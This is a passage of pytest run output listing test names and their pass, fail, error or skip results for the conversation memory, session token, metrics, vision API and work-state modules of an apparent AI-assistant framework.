tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_003_detects_visual_keywords PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_004_warns_retry_without_diagnosis PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_004_passes_retry_with_diagnosis PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_004_skips_non_retry_requests PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_prevents_css_incident_november_9th PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_prevents_vision_api_incident_november_9th PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_blocking_rules_prevent_execution PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_warning_rules_allow_execution PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_001_applies_to_all_fix_types[bug_fix] PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_001_applies_to_all_fix_types[feature] PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_001_applies_to_all_fix_types[refactor] PASSED [ 68%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_001_applies_to_all_fix_types[css_change] PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestAddConversation::test_add_conversation_creates_record PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestAddConversation::test_add_conversation_with_minimal_data PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestAddConversation::test_add_conversation_sets_timestamps PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestGetConversation::test_get_existing_conversation PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestGetConversation::test_get_nonexistent_conversation PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestGetConversation::test_get_conversation_includes_all_fields PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestGetRecentConversations::test_get_recent_orders_by_created_at PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestGetRecentConversations::test_get_recent_respects_limit PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestGetRecentConversations::test_get_recent_empty_database PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestSetActiveConversation::test_set_active_marks_conversation_active PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestSetActiveConversation::test_set_active_deactivates_others PASSED [ 68%]
tests/tier1/conversations/test_conversation_manager.py::TestSetActiveConversation::test_set_active_nonexistent_conversation PASSED [ 69%]
tests/tier1/conversations/test_conversation_manager.py::TestUpdateConversation::test_update_title PASSED [ 69%]
tests/tier1/conversations/test_conversation_manager.py::TestUpdateConversation::test_update_summary PASSED [ 69%]
tests/tier1/conversations/test_conversation_manager.py::TestUpdateConversation::test_update_tags PASSED [ 69%]
tests/tier1/conversations/test_conversation_manager.py::TestUpdateConversation::test_update_message_count PASSED [ 69%]
tests/tier1/conversations/test_conversation_manager.py::TestDeleteConversation::test_delete_removes_conversation PASSED [ 69%]
tests/tier1/conversations/test_conversation_manager.py::TestDeleteConversation::test_delete_nonexistent_conversation PASSED [ 69%]
tests/tier1/conversations/test_conversation_search.py::TestSearchByKeyword::test_search_finds_title_match PASSED [ 69%]
tests/tier1/conversations/test_conversation_search.py::TestSearchByKeyword::test_search_case_insensitive PASSED [ 69%]
tests/tier1/conversations/test_conversation_search.py::TestSearchByKeyword::test_search_no_matches PASSED [ 69%]
tests/tier1/conversations/test_conversation_search.py::TestSearchByDateRange::test_search_within_date_range PASSED [ 69%]
tests/tier1/conversations/test_conversation_search.py::TestSearchByDateRange::test_search_outside_date_range PASSED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_file_entities FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_file_entities ERROR [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_class_entities FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_class_entities ERROR [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_method_entities FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_method_entities ERROR [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_multiple_entity_types FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_multiple_entity_types ERROR [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_with_no_entities PASSED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_after_extraction FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_after_extraction ERROR [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_empty_conversation FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_empty_conversation ERROR [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_includes_access_count FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_includes_access_count ERROR [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_empty_database FAILED [ 69%]
tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_empty_database ERROR [ 69%]
tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_no_eviction_under_limit FAILED [ 70%]
tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_evicts_oldest_when_at_capacity FAILED [ 70%]
tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_never_evicts_active_conversation FAILED [ 70%]
tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_never_evicts_active_conversation ERROR [ 70%]
tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_eviction_logs_event FAILED [ 70%]
tests/tier1/fifo/test_queue_manager.py::TestGetQueueStatus::test_status_shows_correct_counts FAILED [ 70%]
tests/tier1/fifo/test_queue_manager.py::TestGetQueueStatus::test_status_empty_database FAILED [ 70%]
tests/tier1/fifo/test_queue_manager.py::TestGetEvictionLog::test_log_empty_initially PASSED [ 70%]
tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_single_message FAILED [ 70%]
tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_single_message ERROR [ 70%]
tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_multiple_messages FAILED [ 70%]
tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_multiple_messages ERROR [ 70%]
tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_messages_to_different_conversations FAILED [ 70%]
tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_messages_to_different_conversations ERROR [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_preserves_order FAILED [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_preserves_order ERROR [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_empty_conversation FAILED [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_empty_conversation ERROR [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_includes_all_fields FAILED [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_includes_all_fields ERROR [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessageCount::test_count_after_adding_messages PASSED [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessageCount::test_count_empty_conversation PASSED [ 70%]
tests/tier1/messages/test_message_store.py::TestGetMessageCount::test_count_after_multiple_adds PASSED [ 70%]
tests/tier1/messages/test_message_store.py::TestDeleteMessages::test_delete_removes_all_messages FAILED [ 70%]
tests/tier1/messages/test_message_store.py::TestDeleteMessages::test_delete_removes_all_messages ERROR [ 70%]
tests/tier1/messages/test_message_store.py::TestDeleteMessages::test_delete_nonexistent_conversation PASSED [ 70%]
tests/tier1/test_conversation_manager.py::TestDatabaseInitialization::test_creates_database_file PASSED [ 70%]
tests/tier1/test_conversation_manager.py::TestDatabaseInitialization::test_creates_all_tables PASSED [ 70%]
tests/tier1/test_conversation_manager.py::TestDatabaseInitialization::test_creates_indexes PASSED [ 70%]
tests/tier1/test_conversation_manager.py::TestDatabaseInitialization::test_schema_is_idempotent PASSED [ 70%]
tests/tier1/test_conversation_manager.py::TestConversationCRUD::test_create_conversation PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestConversationCRUD::test_get_conversation PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestConversationCRUD::test_get_nonexistent_conversation PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestConversationCRUD::test_end_conversation PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestConversationCRUD::test_get_active_conversation PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestConversationCRUD::test_get_active_conversation_no_active PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestConversationCRUD::test_conversation_with_context PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestMessageManagement::test_add_message PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestMessageManagement::test_get_messages PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestMessageManagement::test_message_order PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestMessageManagement::test_message_count_update PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestMessageManagement::test_get_messages_empty_conversation PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestEntityTracking::test_add_entity PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestEntityTracking::test_add_multiple_entities PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestEntityTracking::test_get_entities_by_type PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestEntityTracking::test_get_entities_empty PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestEntityTracking::test_entity_timestamps PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestFileTracking::test_add_file PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestFileTracking::test_add_multiple_files PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestFileTracking::test_file_operation_types PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestFileTracking::test_get_files_empty PASSED [ 71%]
tests/tier1/test_conversation_manager.py::TestFileTracking::test_file_timestamps PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestFIFOQueue::test_max_conversations_limit PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestFIFOQueue::test_fifo_enforcement PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestFIFOQueue::test_fifo_preserves_active_conversations PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestFIFOQueue::test_fifo_deletes_oldest_first PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestStatisticsAndQueries::test_get_statistics PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestStatisticsAndQueries::test_get_recent_conversations PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestStatisticsAndQueries::test_get_conversation_count PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestStatisticsAndQueries::test_get_message_count_all PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestStatisticsAndQueries::test_get_message_count_specific PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestSearchAndFilter::test_search_by_agent_id PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestSearchAndFilter::test_search_by_date_range PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestSearchAndFilter::test_search_by_has_goal PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestSearchAndFilter::test_search_multiple_criteria PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestExportFunctionality::test_export_conversation_jsonl PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestExportFunctionality::test_export_to_jsonl_file PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestExportFunctionality::test_export_nonexistent_conversation PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestExportFunctionality::test_export_creates_directory PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_save_planning_session PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_load_planning_session PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_load_nonexistent_session PASSED [ 72%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_list_planning_sessions PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_planning_session_with_final_plan PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_planning_session_update PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_planning_questions_order PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestInteractivePlanning::test_planning_answers_chronology PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestIntegration::test_full_conversation_lifecycle PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestIntegration::test_concurrent_conversations PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestErrorHandling::test_invalid_conversation_id PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestErrorHandling::test_database_path_creation PASSED [ 73%]
tests/tier1/test_conversation_manager.py::TestErrorHandling::test_context_manager_exception_handling PASSED [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimizer_initialization ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimizer_without_sklearn_raises_error SKIPPED [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_conversation_context_basic ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_with_few_conversations ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_with_empty_intent ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_with_empty_conversations ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_relevance_scoring ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_recency_boost ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_token_counting ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_quality_score_calculation ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimization_time ERROR [ 73%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_pattern_context_basic ERROR [ 74%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_patterns_below_limit ERROR [ 74%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_patterns_without_query ERROR [ 74%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_pattern_relevance_scoring ERROR [ 74%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_statistics_tracking ERROR [ 74%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_error_handling_fallback ERROR [ 74%]
tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_none_conversation_content ERROR [ 74%]
tests/tier1/test_session_token.py::TestDatabaseInitialization::test_database_created PASSED [ 74%]
tests/tier1/test_session_token.py::TestDatabaseInitialization::test_session_tokens_table_exists PASSED [ 74%]
tests/tier1/test_session_token.py::TestDatabaseInitialization::test_indexes_created PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionCreation::test_create_session_basic PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionCreation::test_create_session_with_conversation PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionCreation::test_create_session_with_work_session PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionCreation::test_create_session_with_metadata PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionCreation::test_token_uniqueness PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionRetrieval::test_get_session_by_token PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionRetrieval::test_get_session_nonexistent PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionRetrieval::test_get_active_session PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionRetrieval::test_get_active_session_none PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionRetrieval::test_get_active_session_most_recent PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionAssociations::test_associate_conversation PASSED [ 74%]
tests/tier1/test_session_token.py::TestSessionAssociations::test_associate_work_session PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionAssociations::test_association_updates_activity PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionLifecycle::test_update_activity PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionLifecycle::test_pause_session PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionLifecycle::test_resume_session PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionLifecycle::test_complete_session PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionLifecycle::test_expire_session PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionClass::test_session_to_dict PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionClass::test_is_stale_false PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionClass::test_is_stale_true PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionClass::test_age_hours PASSED [ 75%]
tests/tier1/test_session_token.py::TestBulkRetrieval::test_get_all_active_sessions PASSED [ 75%]
tests/tier1/test_session_token.py::TestBulkRetrieval::test_get_all_active_sessions_empty PASSED [ 75%]
tests/tier1/test_session_token.py::TestBulkRetrieval::test_get_all_active_sessions_order PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionSearch::test_find_by_conversation PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionSearch::test_find_by_conversation_not_found PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionSearch::test_find_by_work_session PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionSearch::test_find_by_work_session_not_found PASSED [ 75%]
tests/tier1/test_session_token.py::TestSessionSearch::test_find_by_conversation_most_recent PASSED [ 75%]
tests/tier1/test_session_token.py::TestStaleSessionCleanup::test_cleanup_stale_sessions PASSED [ 75%]
tests/tier1/test_session_token.py::TestStaleSessionCleanup::test_cleanup_no_stale_sessions PASSED [ 75%]
tests/tier1/test_session_token.py::TestStaleSessionCleanup::test_cleanup_preserves_completed PASSED [ 76%]
tests/tier1/test_session_token.py::TestStatistics::test_get_statistics_empty PASSED [ 76%]
tests/tier1/test_session_token.py::TestStatistics::test_get_statistics_with_sessions PASSED [ 76%]
tests/tier1/test_session_token.py::TestStatistics::test_get_statistics_average_duration PASSED [ 76%]
tests/tier1/test_session_token.py::TestEdgeCases::test_operations_on_nonexistent_token PASSED [ 76%]
tests/tier1/test_session_token.py::TestEdgeCases::test_multiple_pauses_and_resumes PASSED [ 76%]
tests/tier1/test_session_token.py::TestEdgeCases::test_session_with_empty_metadata PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_collector_initialization PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_record_request_basic PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_record_multiple_requests PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_record_request_invalidates_cache PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_get_current_metrics_structure PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_optimization_percentage_calculation PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_cost_calculation PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_average_tokens_per_request PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_zero_requests_metrics PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_cache_utilization_calculation PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_cache_status_determination PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_metrics_caching PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_force_refresh_bypasses_cache PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_get_session_summary PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_session_summary_best_worst_reduction PASSED [ 76%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_session_summary_average_quality PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_get_request_history_all PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_get_request_history_limited PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_export_session_data PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_export_default_path PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsCollector::test_reset_session PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsFormatter::test_format_tokens PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsFormatter::test_format_cost PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsFormatter::test_format_percentage PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsFormatter::test_format_filesize PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsFormatter::test_format_duration PASSED [ 77%]
tests/tier1/test_token_metrics.py::TestTokenMetricsFormatter::test_format_metrics_summary PASSED [ 77%]
tests/tier1/test_vision_api.py::TestVisionAPIBasics::test_vision_api_initialization PASSED [ 77%]
tests/tier1/test_vision_api.py::TestVisionAPIBasics::test_vision_api_disabled_by_default PASSED [ 77%]
tests/tier1/test_vision_api.py::TestVisionAPIBasics::test_analyze_image_when_disabled PASSED [ 77%]
tests/tier1/test_vision_api.py::TestImageValidation::test_validate_valid_png PASSED [ 77%]
tests/tier1/test_vision_api.py::TestImageValidation::test_validate_valid_jpeg PASSED [ 77%]
tests/tier1/test_vision_api.py::TestImageValidation::test_validate_invalid_format PASSED [ 77%]
tests/tier1/test_vision_api.py::TestTokenEstimation::test_estimate_tokens_for_small_image FAILED [ 77%]
tests/tier1/test_vision_api.py::TestTokenEstimation::test_estimate_tokens_without_pil FAILED [ 77%]
tests/tier1/test_vision_api.py::TestBudgetEnforcement::test_reject_image_exceeding_budget FAILED [ 77%]
tests/tier1/test_vision_api.py::TestBudgetEnforcement::test_accept_image_within_budget PASSED [ 78%]
tests/tier1/test_vision_api.py::TestCaching::test_cache_analysis_result PASSED [ 78%]
tests/tier1/test_vision_api.py::TestCaching::test_cache_expiration PASSED [ 78%]
tests/tier1/test_vision_api.py::TestCaching::test_cache_disabled PASSED  [ 78%]
tests/tier1/test_vision_api.py::TestMetrics::test_metrics_collection FAILED [ 78%]
tests/tier1/test_vision_api.py::TestMetrics::test_cache_hit_rate_calculation PASSED [ 78%]
tests/tier1/test_vision_api.py::TestIntegration::test_full_analysis_workflow PASSED [ 78%]
tests/tier1/test_vision_api.py::TestIntegration::test_error_recovery PASSED [ 78%]
tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_intent_router_detects_image_base64 PASSED [ 78%]
tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_intent_router_detects_image_path PASSED [ 78%]
tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_intent_router_detects_image_data PASSED [ 78%]
tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_intent_router_detects_screenshot_keyword PASSED [ 78%]
tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_screenshot_analyzer_receives_image PASSED [ 78%]
tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_vision_api_auto_engagement_end_to_end FAILED [ 78%]
tests/tier1/test_vision_api_auto_engagement.py::TestVisionAPIAutoEngagement::test_vision_api_not_engaged_without_image PASSED [ 78%]
tests/tier1/test_work_state_manager.py::TestDatabaseInitialization::test_database_created PASSED [ 78%]
tests/tier1/test_work_state_manager.py::TestDatabaseInitialization::test_work_sessions_table_exists PASSED [ 78%]
tests/tier1/test_work_state_manager.py::TestDatabaseInitialization::test_work_progress_table_exists PASSED [ 78%]
tests/tier1/test_work_state_manager.py::TestDatabaseInitialization::test_indexes_created PASSED [ 78%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_start_task_basic PASSED [ 78%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_start_task_with_files PASSED [ 78%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_start_task_with_metadata PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_update_progress PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_update_progress_multiple_times PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_complete_task PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_pause_task PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestTaskLifecycle::test_abandon_task PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_get_current_state_with_active_work PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_get_current_state_no_active_work PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_get_state_by_id PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_get_state_nonexistent PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_has_incomplete_work_true PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_has_incomplete_work_false PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_get_incomplete_sessions PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStateRetrieval::test_get_recent_completed PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestWorkStateClass::test_work_state_to_dict PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestWorkStateClass::test_work_state_from_dict PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestWorkStateClass::test_is_stale_false PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestWorkStateClass::test_is_stale_true PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestWorkStateClass::test_duration_minutes PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStaleSessionCleanup::test_cleanup_stale_sessions PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStaleSessionCleanup::test_cleanup_no_stale_sessions PASSED [ 79%]
tests/tier1/test_work_state_manager.py::TestStatistics::test_get_statistics_empty PASSED [ 80%]
tests/tier1/test_work_state_manager.py::TestStatistics::test_get_statistics_with_sessions PASSED [ 80%]
tests/tier1/test_work_state_manager.py::TestStatistics::test_get_statistics_average_duration PASSED [ 80%]
tests/tier1/test_work_state_manager.py::TestFileAggregation::test_files_aggregated_correctly PASSED [ 80%]
tests/tier1/test_work_state_manager.py::TestFileAggregation::test_files_sorted PASSED [ 80%]
tests/tier1/test_work_state_manager.py::TestEdgeCases::test_update_progress_no_active_session PASSED [ 80%]
tests/tier1/test_work_state_manager.py::TestEdgeCases::test_complete_task_no_session PASSED [ 80%]
tests/tier1/test_work_state_manager.py::TestEdgeCases::test_get_incomplete_sessions_exclude_stale PASSED [ 80%]
tests/tier1/test_working_memory.py::TestDatabaseInitialization::test_creates_database_file PASSED [ 80%]
tests/tier1/test_working_memory.py::TestDatabaseInitialization::test_creates_all_tables PASSED [ 80%]
tests/tier1/test_working_memory.py::TestDatabaseInitialization::test_creates_indexes PASSED [ 80%]
tests/tier1/test_working_memory.py::TestConversationManagement::test_adds_conversation PASSED [ 80%]
tests/tier1/test_working_memory.py::TestConversationManagement::test_gets_conversation_by_id PASSED [ 80%]
tests/tier1/test_working_memory.py::TestConversationManagement::test_gets_recent_conversations PASSED [ 80%]
tests/tier1/test_working_memory.py::TestConversationManagement::test_marks_conversation_as_active PASSED [ 80%]
tests/tier1/test_working_memory.py::TestConversationManagement::test_updates_conversation PASSED [ 80%]
tests/tier1/test_working_memory.py::TestFIFOQueue::test_stores_20_conversations_without_eviction PASSED [ 80%]
tests/tier1/test_working_memory.py::TestFIFOQueue::test_evicts_oldest_when_21st_added PASSED [ 80%]
tests/tier1/test_working_memory.py::TestFIFOQueue::test_never_evicts_active_conversation PASSED [ 80%]
tests/tier1/test_working_memory.py::TestFIFOQueue::test_logs_eviction_events PASSED [ 80%]
tests/tier1/test_working_memory.py::TestEntityExtraction::test_extracts_file_entities PASSED [ 80%]
tests/tier1/test_working_memory.py::TestEntityExtraction::test_extracts_class_entities PASSED [ 81%]
tests/tier1/test_working_memory.py::TestEntityExtraction::test_extracts_method_entities PASSED [ 81%]
tests/tier1/test_working_memory.py::TestEntityExtraction::test_links_entities_to_conversations PASSED [ 81%]
tests/tier1/test_working_memory.py::TestSearchAndQuery::test_searches_conversations_by_keyword PASSED [ 81%]
